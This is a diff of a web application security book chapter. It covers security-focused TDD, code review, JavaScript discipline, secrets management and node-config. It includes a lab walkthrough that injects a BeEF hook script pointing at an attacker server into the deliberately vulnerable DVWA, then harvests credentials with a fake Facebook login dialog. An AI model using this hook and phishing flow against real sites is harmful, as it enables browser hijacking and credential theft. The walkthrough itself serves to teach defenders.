@@ -4,15 +4,15 @@
 
 ## Development Practices
 
-Let's look at some of the practices we can use as developers to lift the level of security within our software.
+Let us look at some of the practices we can use as developers to lift the level of security within our software.
 
 ### Architecture
 
 There are no architects in Scrum. Just Developers. Some of those developers have architect qualities. They like to step back often to see the bigger picture and understand the interactions between the components and the people using the software. Including every aspect to do with the end product, the people intending to use it and the risks.
 
-Agile architecture does a little design up front in collaboration with the team and everyone that has a vested interest. Agile architecture is not siloed, because it's part of development, just as analysing requirements and testing. It's all done in parallel.
+Agile architecture does a little design up front in collaboration with the team and everyone that has a vested interest. Agile architecture is not siloed, because it is part of development, just as analysing requirements and testing. It is all done in parallel.
 
-So, we don't really separate the discipline of architecture from a software developer that excels at doing what a traditional architect does as well as engineering.
+So, we do not really separate the discipline of architecture from a software developer that excels at doing what a traditional architect does as well as engineering.
 
 &nbsp;
 
@@ -20,16 +20,16 @@ So, we don't really separate the discipline of architecture from a software deve
 
 ![](images/red_green_refactor.jpg)
 
-There are a couple of aspects I'd like to focus on here. You can simply continue to use your existing automated test suites and frameworks. All you have to do is:
+There are a couple of aspects I would like to focus on here. You can simply continue to use your existing automated test suites and frameworks. All you have to do is:
 
 1. Add a **security focused test API** into the mix of your existing automated acceptance test suites.  
- You're chosen (language specific) BDD framework of choice, putting legs to your test conditions with automatable "[Given, When, Thens](http://blog.binarymist.net/2012/03/24/how-to-optimise-your-testing-effort/#planningTheTestEffort)".
+ Your chosen (language specific) BDD framework of choice, putting legs to your test conditions with automatable "[Given, When, Thens](http://blog.binarymist.net/2012/03/24/how-to-optimise-your-testing-effort/#planningTheTestEffort)".
 2. Add **security focused BDD/TDD/ATDD** tests.
- This is the same amount of work as any other automated TDD, but it has the huge benefit of bringing the finding of security faults from where it's very expensive to fix:  
+ This is the same amount of work as any other automated TDD, but it has the huge benefit of bringing the finding of security faults from where it is very expensive to fix:  
 
     ![](images/CostOfChange.png)  
 
-    to where it's the cheapest possible place to fix:
+    to where it is the cheapest possible place to fix:
 
     ![](images/CostOfChange-WithSTDD.png)  
 
@@ -49,7 +49,7 @@ There are a couple of aspects I'd like to focus on here. You can simply continue
 
   
     This allows us to within our Behavioural, Acceptance tests, send requests programmatically directly to the ZAP HTTP API to do what ever we could do manually with the tool against the System Under Test (SUT).
- You can of course use Selenium 2 (WebDriver) also to drive browser tests and in parallel. I discussed this in ["Automating Specificatioin by Example"](http://blog.binarymist.net/2014/02/22/automating-specification-by-example-for-net/#scope).
+ You can of course use Selenium 2 (WebDriver) also to drive browser tests and in parallel. I discussed this in ["Automating Specification by Example"](http://blog.binarymist.net/2014/02/22/automating-specification-by-example-for-net/#scope).
 
     The ZAP API can be accessed directly or by any of the following client implementations:
 
@@ -57,11 +57,11 @@ There are a couple of aspects I'd like to focus on here. You can simply continue
     * Python
     * PHP
     * Ruby
-    * .Net [write-up](http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta), [source](https://github.com/gustavorhm/ZapPenTester). It's easy to see how the API is started and used [here](https://github.com/gustavorhm/ZapPenTester/blob/master/ZAPPenTester/Zap.cs).  
- There's also the [OWASP Secure TDD Project](https://www.owasp.org/index.php/OWASP_Secure_TDD_Project). A .Net solution. This project appears to either be abandoned or just very low activity. Feel free to offer to help though if you're a .Net developer. I'm not sure I agree with one of the opening statements: "they need to cover all tests prior development". The approach that I'd take would be to write some specification (test), execute it, (red) -> Write the smallest amount of code possible to make it pass (green) -> Add to the specification (test)(refactor). As you can see that's your red->green->refactor loop, with the smallest amount possible for each iteration.
+    * .Net [write-up](http://www.codeproject.com/Articles/708129/Automated-penetration-testing-in-the-Microsoft-sta), [source](https://github.com/gustavorhm/ZapPenTester). It is easy to see how the API is started and used [here](https://github.com/gustavorhm/ZapPenTester/blob/master/ZAPPenTester/Zap.cs).  
+ There is also the [OWASP Secure TDD Project](https://www.owasp.org/index.php/OWASP_Secure_TDD_Project). A .Net solution. This project appears to either be abandoned or just very low activity. Feel free to offer to help though if you are a .Net developer. I am not sure I agree with one of the opening statements: "they need to cover all tests prior development". The approach that I would take would be to write some specification (test), execute it, (red) -> Write the smallest amount of code possible to make it pass (green) -> Add to the specification (test)(refactor). As you can see that is your red->green->refactor loop, with the smallest amount possible for each iteration.
     * Java. A couple of client projects useful for seeing how to use the ZAP API: [zap-webdriver](https://github.com/continuumsecurity/zap-webdriver), [bdd-security](https://github.com/continuumsecurity/bdd-security)
 
-    For getting started with OWASP ZAPs API chcek the:
+    For getting started with OWASP ZAPs API check the:
 
     * [regression testing](https://code.google.com/p/zaproxy/wiki/SecRegTests)
     * [API details](https://code.google.com/p/zaproxy/wiki/ApiDetails)
@@ -69,7 +69,7 @@ There are a couple of aspects I'd like to focus on here. You can simply continue
 2. Continuing No. 2 from above: This is adding another aspect to your existing TDD/BDD thought process. Instead of the business waiting until go-live before contracting the experts to beat up your system. Then tell you **your security sucks**. We take a proactive approach and move a lot of the effort traditionally performed at go-live **up front**, where you yourself as the developer can test and fix. Thus saving embarrassment and the business a lot of money.  
 BSIMM has some good [guidance on security testing](https://www.bsimm.com/online/ssdl/st/)
 
-What's so good about STDD and SBDD, is that it roles up Specifications, Design, Implementation and Verification all into one process. Thus working toward delivering each increment that's truly ["Done"](http://blog.binarymist.net/2013/03/02/how-to-increase-software-developer-productivity/#definitionOfDone). Driving development with tests is not about testing right? It's about creating code that's testable. Testable code is inherently well designed and gives us the ability to reason about the state at any given time.  
+What is so good about STDD and SBDD, is that it roles up Specifications, Design, Implementation and Verification all into one process. Thus working toward delivering each increment that is truly ["Done"](http://blog.binarymist.net/2013/03/02/how-to-increase-software-developer-productivity/#definitionOfDone). Driving development with tests is not about testing right? It is about creating code that is testable. Testable code is inherently well designed and gives us the ability to reason about the state at any given time.  
 OpenSSL Heartbleed and Apples Goto Fail could have been prevented if (S)TDD was used. Check out Mike Bland's [excellent study and POC](http://martinfowler.com/articles/testing-culture.html).
 
 <!--- Other Resources: http://www.continuumsecurity.net/services.html#testing -->
@@ -84,20 +84,20 @@ As previously discussed, this can be costly when performed late in a projects li
 
 Get creative.
 
-There is no reason why developers can not take a good chunk of the manual penetration testing effort on as part of their daily development practices. In fact in most teams I've lead, this has been exactly how we've worked. The gorilla testing needs to be performed in parallel with the PBIs in the Scrum Backlog as developers pull them into Work I Progress (WIP).
+There is no reason why developers can not take a good chunk of the manual penetration testing effort on as part of their daily development practices. In fact in most teams I have lead, this has been exactly how we have worked. The gorilla testing needs to be performed in parallel with the PBIs in the Scrum Backlog as developers pull them into Work I Progress (WIP).
 
-Some developers gravitate toward security more than others, so it's important to have at least a none zero number of developers with a security focus within each team to:
+Some developers gravitate toward security more than others, so it is important to have at least a none zero number of developers with a security focus within each team to:
 
 1. take the lead on the security front
 2. mentor and pass on their knowledge and passion to others
 
-BSIMM againg has some [good guidance](https://www.bsimm.com/online/deployment/pt/) on hands on penetration testing.
+BSIMM again has some [good guidance](https://www.bsimm.com/online/deployment/pt/) on hands on penetration testing.
 
 &nbsp;
 
 ### Code Review
 
-If we can't get the simple things right like [Coding standards and conventions](http://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/) to help remove some of the "wild west" attitudes and behaviours, then how will we ever get the complicated things right? The whole team needs to abide by the standards, conventions and guidelines.
+If we can not get the simple things right like [Coding standards and conventions](http://blog.binarymist.net/2012/12/19/javascript-coding-standards-and-guidelines/) to help remove some of the "wild west" attitudes and behaviours, then how will we ever get the complicated things right? The whole team needs to abide by the standards, conventions and guidelines.
 
 [Callback Hell Alternatives](http://blog.binarymist.net/2014/07/26/node-js-asynchronicity-and-callback-nesting/) for example.
 
@@ -107,7 +107,7 @@ Check out the [BSIMM Code Review](https://www.bsimm.com/online/ssdl/cr/) for som
 
 #### Why?
 
-Because when humans are in creative mode, we often struggle to see the defects in our own creation. That's why tightly knit teams are a force to be reckoned with. We are good at seeing faults in others and their creations. That's why we really do need each other. Never underestimate this blindness in us all and that we have a very powerful mitigation tool in the team. Use it.
+Because when humans are in creative mode, we often struggle to see the defects in our own creation. That is why tightly knit teams are a force to be reckoned with. We are good at seeing faults in others and their creations. That is why we really do need each other. Never underestimate this blindness in us all and that we have a very powerful mitigation tool in the team. Use it.
 
 #### Linting, Static Analysis
 
@@ -120,7 +120,7 @@ Techniques and tools to assist with automating
 
 #### Dynamic Analysis
 
-Tooling is still immature here. We've got a way to go, but lets start getting our feet wet.
+Tooling is still immature here. We have got a way to go, but lets start getting our feet wet.
 
 * [Titanium Code Processor](https://theoreticalideations.com/tag/titanium-code-processor/)
 * [Slide Deck](https://speakerdeck.com/ariya/dynamic-code-analysis-for-javascript)
@@ -132,33 +132,34 @@ Tooling is still immature here. We've got a way to go, but lets start getting ou
 
 JavaScript is an inherently flexible and undisciplined language. This quality is a double edged sword. It provides us with extreme power and also allows us to slaughter ourselves. Discipline is very much needed in order to stay safe and be able to reason about our applications as they grow larger.
 
-I've been involved in many JavaScript project rescue missions where a development team can no longer understand what the monster they have created is doing, what state it is in and why? In almost all occasions, the developers on the team do not have a deep understanding of the language and often of any language. Because of this I always try and push the fact that JavaScript developers must do everything they can to understand the language. In most cases this means taking their learning home and getting intimate with JavaScripts beauty.
+I have been involved in many JavaScript project rescue missions where a development team can no longer understand what the monster they have created is doing, what state it is in and why? In almost all occasions, the developers on the team do not have a deep understanding of the language and often of any language. Because of this I always try and push the fact that JavaScript developers must do everything they can to understand the language. In most cases this means taking their learning home and getting intimate with JavaScripts beauty.
 
-Because of the distinct lack of discipline within JavaScript (unlike most other languages) I try and bring as much understanding around techniques that can help impose the extra rigour where and when it's needed. The beautiful thing about JavaScript is that when you really need to do something unconventional, you can, but I like to **weigh up the trade-offs** of either approach.
+Because of the distinct lack of discipline within JavaScript (unlike most other languages) I try and bring as much understanding around techniques that can help impose the extra rigour where and when it is needed. The beautiful thing about JavaScript is that when you really need to do something unconventional, you can, but I like to **weigh up the trade-offs** of either approach.
 
 #### Static Type Checking
 
 In JavaScript we need as much help as we can to fail fast. Static type checking gives us this. It also feels like the step before DbC.
 
-* [flow](http://flowtype.org/) looks to be a good option. Providing consumers with the option of introducing type checking progressivly and/or to certain parts that make the most sense. Or rather missing parts that require the extra flexibility.
+* [flow](http://flowtype.org/) looks to be a good option. Providing consumers with the option of introducing type checking progressively and/or to certain parts that make the most sense. Or rather missing parts that require the extra flexibility.
 
 
 #### Design by Contract (DbC)
 
 Enforcing preconditions, postconditions and invariants in our routines.
-That's right, we can even employ this design principle in JavaScript. I wrote about DbC in a [previous post](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#dbc) in regards to usage in .Net.  
-In JavaScript, I believe the DbC principle is even more important as part of adding discipline and keeping us on the straight and narrow. I believe DbC is the principle that helps us achieve the [Liskov Substitution Principle](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#lsp), which is the 'L' in the SOLID design mnemonic. These are the offerings I've noticed that provide support:
+That is right, we can even employ this design principle in JavaScript. I wrote about DbC in a [previous post](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#dbc) in regards to usage in .Net.  
+In JavaScript, I believe the DbC principle is even more important as part of adding discipline and keeping us on the straight and narrow. I believe DbC is the principle that helps us achieve the [Liskov Substitution Principle](http://blog.binarymist.net/2010/10/11/lsp-dbc-and-nets-support/#lsp), which is the 'L' in the SOLID design mnemonic. These are the offerings I have noticed that provide support:
 
 1. [ristretto-js](https://code.google.com/p/ristretto-js/w/list)
 2. [contract-js on NPM](https://www.npmjs.com/package/contracts-js)
   * [contract.js at home](http://www.contractsjs.org/)
 3. [contractual on NPM](https://www.npmjs.com/package/contractual)
 
-In many cases you can implement your cross cutting code contracts using AOP. This gets it out of your code, so that it's not in your face.
+In many cases you can implement your cross cutting code contracts using AOP. This gets it out of your code, so that it is not in your face.
 
 ### Forming Habits
 
 _Todo_
+
 %% Start out the way you want to end.
 
 
@@ -173,10 +174,9 @@ _Todo_
 
 
 ## 1. SSM Asset Identification
-Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered.
+Take results from [higher level Asset Identification](#ssm-asset-identification). Remove any that are not applicable. Add any newly discovered. Here are some to get you started:
 
-* Ownership
-  Similarly as addressed in the VPS chapter, Don't assume that ownership, or at least control of your server is something you'll always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that's because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the [Web Application Firewall](#web-applications-countermeasures-waf) section where AppSensor can help.
+* Ownership. Similarly as addressed in the VPS chapter, Do not assume that ownership, or at least control of your server(s) is something you will always have. Ownership is often one of the first assets an attacker will attempt to take from a target in order to execute further exploits. At first this may sound strange, but that is because of an assumption you may have that you will always own (have control of) your web application. Hopefully I dispelled this myth in the VPS chapter. If an attacker can take control of your web application (own it/steal it/what ever you want to call the act), then they have a foot hold to launch further attacks and gain other assets of greater value. The web application itself will often just be a stepping stone to other assets that you assume are safe. With this in mind, your web application is an asset. On the other hand you could think of it as a liability. Both may be correct. In any case, you need to protect your web application and in many cases take it to school and teach it how to protect itself. I cover that under the [Web Application Firewall](#web-applications-countermeasures-waf) section, where AppSensor can help.
 * Intellectual property or sensitive information within the code or configuration files such as email addresses and account credentials for the likes of data-stores, syslog servers, monitoring services. We address this in [Management of Application Secrets](#web-applications-ssm-identify-risks-management-of-application-secrets)
 * Sensitive Client/Customer data.
 
@@ -188,7 +188,7 @@ Go through same process as we did at the [top level](#ssm-identify-risks), but f
   * [Part 1](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with.html)
   * [Part 2](http://blog.beefproject.com/2015/01/hooked-browser-meshed-networks-with_26.html)
 
-This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities don't change a lot
+This slide was from a talk I did at OWASP NZ Day 2013. The top 10 vulnerabilities do not change a lot
 
 &nbsp;
 
@@ -206,13 +206,17 @@ The unchangeable vulnerabilities are:
 * No. 4 Insecure Direct Object References
 * No. 5 Security Misconfiguration
 * No. 8 Frameworks are helping with CSRF
-* No. 9 is new, because we’re now consuming a lot more packages without vetting them.
+* No. 9 is new, because we are now consuming a lot more packages without vetting them.
 
 &nbsp;
 
 ![](images/OWASPTop10SomeThingsDontChange.jpg)
 
 {pagebreak}
+
+### Lack of Visibility
+
+_Todo_
 
 ### Lack of Input Sanitisation {#web-applications-identify-risks-lack-of-input-sanitisation}
 ![](images/ThreatTags/easy-common-average-severe.png)
@@ -236,22 +240,22 @@ _Todo_ [Discuss intricacies of XSS](https://github.com/binarymist/HolisticInfoSe
 
 The following attack was the first one of five that I demonstrated at WDCNZ in 2015. The attack after this one was a credential harvest based on a spoofed website that hypothetically was fetched due to a spear phishing attack. That particular attack can be found in chapter 8 People, under [Spear Phishing](#people-identify-risks-spear-phishing). 
 
-Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it's likely you would have been through the following:
+Theoretically in order to get to the point where you carry out this attack, you would have already been through several stages first. If you are carrying out a penetration testing engagement, it is likely you would have been through the following:
 
 1. Information gathering (probably partly even before you signed the contract with your client)
 2. Vulnerability scanning
 3. Vulnerability searching
 
-If you're working within a development team you may have found out some other way that your project was vulnerable to XSS.
+If you are working within a development team you may have found out some other way that your project was vulnerable to XSS.
 
-How ever you got to this point, you're going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
-One of BeEF's primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEF's attributes. 
+How ever you got to this point, you are going to want to exhibit the fault. One of the most effective ways to do this is by using BeEF. BeEF clearly shows what is possible when you have an XSS vulnerability in scope and is an excellent tool for effortlessly demonstrating the severity of the fault to all team members and stakeholders.  
+One of BeEFs primary reasons to exist is to exploit the fact that many security philosophies seem to forget how easy it is to go straight through hardened network perimeters and attack the soft mushy insides of a sub network (as discussed in chapter 5 Physical, under the [Fortress Mentality](#physical-identify-risks-fortress-mentality) section). Exposing XSS faults is one of BeEFs attributes. 
 
 You can find the video of how this attack is played out [here](https://www.youtube.com/watch?v=92AWyUfJDUw).
 
 I> ## Synopsis
 I>
-I> In this exercise, I've used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
+I> In this exercise, I have used the Dam Vulnerable Web App (DVWA), as it has the types of XSS vulnerabilities we need in order to demonstrate the power of BeEF. DVWA is included in the OWASP Broken Web Application ([OWASPBWA](https://www.owasp.org/index.php/OWASP_Vulnerable_Web_Applications_Directory_Project)) turn-key VM, along with many other useful purposely vulnerable projects.  
 I> We use BeEF to exploit an XSS vulnerability in DVWA and carry out a simple attack in which we coerce the target to enter their credentials for a website and send them to our BeEF communications server unknowingly.
 
 {icon=bomb}
@@ -261,7 +265,7 @@ G> Make sure you have the OWASPBWA [configured](https://code.google.com/p/owaspb
 G>
 G> From the directory that you have BeEF installed, run the BeEF ruby script: `./beef`
 G>
-G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you've configured TLS) with the user and password that you setup in the BeEF root config.yaml.
+G> Log into the BeEF UI at `http://localhost:3000/ui/authentication` (or using https if you have configured TLS) with the user and password that you set-up in the BeEF root config.yaml.
 G>
 G> Open another browser tab and log-in to the DVWA.
 G>
@@ -273,19 +277,19 @@ G> Enable foxy proxy so that your request goes to the same port that burp suite 
 G>
 G> Fire up burp.
 G>
-G> Back in the DVWA send your request by clicking on the Sign Guestbook button.
+G> Back in the DVWA send your request by clicking on the Sign Guest-book button.
 G>
 G> Switch back to burp -> Proxy tab and the request should be waiting for you. You now need to replace the text you used in the Message field `mtxMessage` with `<script src="http://<BeEF comms server IP address>:3000/hook.js"></script>` and forward the request.
 G>
 G> You can disable FoxyProxy now too.
 G>
-G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you'll now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
+G> Now on your victims machine, the victim can log into DVWA and browse to the same "XSS stored" page. Now as the attacker, you will now notice that the BeEF Web UI shows a node with the victims IP address. This means BeEF has the victims browser hooked. The victims browser is now a zombie, continuously polling the BeEF communications server for commands to execute on its behalf.
 G>
-G> If you open the victims browser developer tools, you'll be able to inspect the communications and the JavaScript within the hook.js file.
+G> If you open the victims browser developer tools, you will be able to inspect the communications and the JavaScript within the hook.js file.
 G>
 G> Back in the BeEF web UI you can explore the modules that you can launch against the victims browser. You can view the types of attacks you can carry out on the [BeEF projects wiki](https://github.com/beefproject/beef/wiki/BeEF-modules).
 G>
-G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you've done due diligence in the reconnaissance stage.
+G> If you select the victims node and click on the Commands tab in the BeEF web UI, then in the Module Tree under Social Engineering select the "Pretty Theft" node. There are some options to configure, but even selecting the default of Facebook if you know your target is already an avid FB user should work fine. You would of course know this if you have done due diligence in the reconnaissance stage.
 G>
 G> Click on the Execute button and on the next request -> response from the hook.js, the victims browser should pop a "Facebook Session Timed Out" modal. To get rid of this modal, the victim must enter their credentials and Log-in. There is no cancel or 'x' button. Once the victim has sent their credentials, they will be visible in the Command results of the BeEF web UI.  
 
@@ -293,12 +297,16 @@ G> Click on the Execute button and on the next request -> response from the hook
 
 ![](images/HandsOnHack.png)
 
- One of the simplest and quickest vulnerabilities to fix, yet it's still top of the hit lists.  
+ One of the simplest and quickest vulnerabilities to fix, yet it is still top of the hit lists.  
  Lets hammer this home some more.
 
 #### Command Injection {#web-applications-identify-risks-command-injection}
 
 ![](images/HandsOnHack.png)
+
+_Todo_
+
+%% NodeJS https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js
 
 #### LDAP Injection {#web-applications-identify-risks-ldap-injection}
 
@@ -320,15 +328,18 @@ _Todo_
 
 _Todo_
 
-### Management of Application Secretes {#web-applications-ssm-identify-risks-management-of-application-secrets}
+### Management of Application Secrets {#web-applications-ssm-identify-risks-management-of-application-secrets}
 
 Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitoring, etc and may even provide credentials to continue moving through the network compromising other machines.
 
-Passwords and/or their hashes travelling over the network.
+Passwords and/or their hashes travelling over the network. Also see the [Wire Inspecting](#network-identify-risks-wire-inspecting) section in the [Network](#network) chapter.
 
 #### Data-store Compromise
+![](images/ThreatTags/difficult-common-average-moderate.png)
 
-There are many examples of this happening on a daily basis to millions of users. The Ashley Madison debacle is a good example. Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret provide discretion and anonymity. 
+The reason I've tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.
+
+There are many examples of this happening on a daily basis to millions of users. The Ashley Madison debacle is a good example. Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, provide discretion and anonymity. 
 
 "_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"
 
@@ -338,9 +349,9 @@ There are many examples of this happening on a daily basis to millions of users.
 
 > Dark Reading
 
-Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [Ebay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 
+Other notable data-store compromises were [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) with 6.5 million user accounts compromised and 95% of the users passwords cracked in days. Why so fast? Because they used simple hashing, specifically SHA-1. [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) with 145 million active buyers. Many others coming to light regularly. 
 
-Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is?
+Are you using well salted and quality strong key derivation functions (KDFs) for all of your sensitive data? Are you making sure you are notifying your customers about using high quality passwords? Are you informing them what a high quality password is? Consider checking new user credentials against a list of the most frequently used and insecure passwords collected.
 
 ### Logging
 
@@ -363,20 +374,24 @@ _Todo_
 
 This is where [A9 (Using Components with Known Vulnerabilities)](https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities) of the 2013 OWASP Top 10 comes in.
 
-We are consuming far more free and open source libraries than we have ever before. Much of the code we're pulling into out projects is never intentionally used, but is still adding surface area for attack. Much of it:
+We are consuming far more free and open source libraries than we have ever before. Much of the code we are pulling into out projects is never intentionally used, but is still adding surface area for attack. Much of it:
 
-* Is not tested (for what it should do and what it shouldn't do)
+* Is not tested (for what it should do and what it should not do)
 * Is not reviewed evaluated
 * Is created by amateurs that could and do include vulnerabilities
 * Does not undergo the same requirement analysis, defining the scope, acceptance criteria, test conditions and sign off by a development team and product owner.
 
-Many vulnerabilities can hide in these external dependencies. It's not just one attack vector anymore, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you don't find and deal with them, I can assure you, someone else will.
+Many vulnerabilities can hide in these external dependencies. It is not just one attack vector any more, it provides the opportunity for many vulnerabilities to be sitting waiting to be exploited. If you do not find and deal with them, I can assure you, someone else will.
 
 See Justin Searls [talk](http://blog.testdouble.com/posts/2014-12-02-the-social-coding-contract.html) on consuming all the open source.
 
 ## 3. SSM Countermeasures
 
 * [MS Application Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_008)
+
+### Lack of Visibility
+
+_Todo_
 
 ### Lack of Input Sanitisation {#web-applications-countermeasures-lack-of-input-sanitisation}
 ![](images/ThreatTags/PreventionAVERAGE.png)
@@ -405,7 +420,7 @@ There are a few options here:
 
 #### Command Injection {#web-applications-countermeasures-command-injection}
 
-On top of the points mentioned above under [Lack of Input Sanitisation](#web-applications-countermeasures-lack-of-input-sanitisation)
+On top of the points mentioned above under [Lack of Input Sanitisation](#web-applications-countermeasures-lack-of-input-sanitisation), 
 [This article](http://www.golemtechnologies.com/articles/shell-injection) is quite good.
 
 %% Command Injection in NodeJS: https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js
@@ -430,52 +445,52 @@ _Todo_
 
 _Todo_
 
-### Management of Application Secretes {#web-applications-ssm-identify-risks-management-of-application-secrets}
+### Management of Application Secrets {#web-applications-ssm-identify-risks-management-of-application-secrets}
 
 Secure password management within applications is a case of doing what you can, often relying on obscurity and leaning on other layers of defence to make it harder for compromise. Like many of the layers already discussed in the previous chapters.
 
-[Find out](#network-countermeasures-wire-inspecting) how secret the data that is supposed to be secrete that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you'll be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you'll still be in good standing.
+[Find out](#network-countermeasures-wire-inspecting) how secret the data that is supposed to be secret that is being sent over the network actually is and consider your internal network just as malicious as the internet. Then you will be starting to get the idea of what defence in depth is about. That way when one defence breaks down, you will still be in good standing.
 
 You may read in many places that having data-store passwords and other types of secrets in configuration files in clear text is an insecurity that must be addressed. Then when it comes to mitigation, there seems to be a few techniques for helping, but most of them are based around obscuring the secret rather than securing it. Essentially just making discovery a little more inconvenient like using an alternative port to SSH to other than the default of 22. Maybe surprisingly though, obscurity does significantly reduce the number of opportunistic type attacks from bots and script kiddies.
 
 #### Store Configuration in Configuration files
+![](images/ThreatTags/PreventionAVERAGE.png)
 
 Do not hard code passwords in source files for all developers to see. Doing so also means the code has to be patched when services are breached. At the very least, store them in configuration files and use different configuration files for different deployments and consider keeping them out of source control.
 
 ##### node-config
 
-node-config is a fully featured, well maintained configuration package that I've used on a good number of projects.
+is a fully featured, well maintained configuration package that I have used on a good number of projects.
 
 To install: From the command line within the root directory of your NodeJS application, run:
 
 `npm install node-config --save`
 
-Now you're ready to start using node-config. An example app.js file may look like the following:
+Now you are ready to start using node-config. An example of the relevant section of an `app.js` file may look like the following:
 
-{title="app.js", linenos=off, lang=js}
-~~~~~~~~
-// Due to bug in node-config the next line is needed before config is required: https://github.com/lorenwest/node-config/issues/202
-if (process.env.NODE_ENV === 'production')
-   process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
-~~~~~~~~
+{title="app.js", linenos=off, lang=JavaScript}
+    // Due to bug in node-config the if statement is required before config is required
+    // https://github.com/lorenwest/node-config/issues/202
+    if (process.env.NODE_ENV === 'production')
+       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
+
 
 Where ever you use node-config, in your routes for example:
 
-{title="home.js", linenos=off, lang=js}
-~~~~~~~~
-var config = require('config');
-var nodemailer = require('nodemailer');
-var enquiriesEmail = config.enquiries.email;
+{title="home.js", linenos=off, lang=JavaScript}
+    var config = require('config');
+    var nodemailer = require('nodemailer');
+    var enquiriesEmail = config.enquiries.email;
+    
+    // Setting up email transport.
+    var transporter = nodemailer.createTransport({
+       service: config.enquiries.service,
+       auth: {
+          user: config.enquiries.user,
+          pass: config.enquiries.pass // App specific password.
+       }
+    });
 
-// Setting up email transport.
-var transporter = nodemailer.createTransport({
-   service: config.enquiries.service,
-   auth: {
-      user: config.enquiries.user,
-      pass: config.enquiries.pass // App specific password.
-   }
-});
-~~~~~~~~
 
 A good collection of different formats can be used for the config files: `.json`, `.json5`, `.hjson`, `.yaml`, `.js`, `.coffee`, `.cson`, `.properties`, `.toml`
 
@@ -483,104 +498,96 @@ There is a specific [file loading order](https://github.com/lorenwest/node-confi
 
 * Having multiple instances of the same application running on the same machine.
 * The use of short and full host names to mitigate machine naming collisions
-* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example. `development`, `production`, `staging`, `whatever`.
+* The type of deployment. This can be anything you set the `$NODE_ENV` environment variable to for example: `development`, `production`, `staging`, `whatever`.
 * Using and creating config files which stay out of source control. These config files have a prefix of `local`. These files are to be managed by external configuration management tools, build scripts, etc. Thus providing even more flexibility about where your sensitive configuration values come from.
 
-The config files for the required attributes used above may look like the following:
+{pagebreak}
 
-{title="directory layout", linenos=off}
-~~~~~~~~
-OurApp/
-|
-+-- config/
-|  |
-|  +-- default.js (usually has the most in it)
-|  |
-|  +-- devbox1-development.js
-|  |
-|  +-- devbox2-development.js
-|  |
-|  +-- stagingbox-staging.js
-|  |
-|  +-- prodbox-production.js
-|  |
-|  +-- local.js (creted by build)
-|
-+-- routes
-|  |
-|  +-- home.js
-|  |
-|  +-- ...
-|
-+-- app.js (entry point)
-|
-+-- ...
-~~~~~~~~
+The config files for the required attributes used above may take the following directory structure:
+
+{title="directory layout", linenos=off, lang=JavaScript}
+    OurApp/
+    |
+    +-- config/
+    |  |
+    |  +-- default.js (usually has the most in it)
+    |  |
+    |  +-- devbox1-development.js
+    |  |
